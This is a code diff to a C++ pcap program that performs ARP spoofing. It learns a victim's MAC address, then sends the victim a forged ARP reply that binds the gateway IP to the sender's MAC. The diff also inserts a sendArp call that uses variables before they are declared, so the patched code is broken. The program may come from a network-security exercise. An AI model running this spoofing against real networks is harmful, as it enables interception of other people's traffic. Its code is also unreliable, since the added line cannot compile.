@@ -27,6 +27,7 @@ void sendArp(pcap_t* handle, Mac senderMac, Ip senderIp, Mac targetEthMac, Mac t
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
+    // request of reply
 	if (isRequest){
 		packet.arp_.op_ = htons(ArpHdr::Request);
 	}
@@ -82,17 +83,18 @@ int main(int argc, char* argv[]) {
 	Ip victimIp = Ip(argv[3]);
 	Ip gatewayIp = Ip("10.1.1.1");
 
+	sendArp(handle, myMac, myIp, broadcastMac, unknownMac, victimIp, true);
 	EthArpPacket packet;
 
 	Mac broadcastMac = Mac("FF:FF:FF:FF:FF:FF");
 	Mac myMac = Mac("00:0C:29:08:CA:15");
 	Mac unknownMac = Mac("00:00:00:00:00:00");
 	
+	// get mac address of victim by ARP request-reply.
 	sendArp(handle, myMac, myIp, broadcastMac, unknownMac, victimIp, true);
-
-
 	Mac victimMac = receiveMacFromArpReply(handle);
-
+	
+	// send arp reply to victim.
 	sendArp(handle, myMac, gatewayIp, victimMac, victimMac, victimIp, false);
 
 	pcap_close(handle);
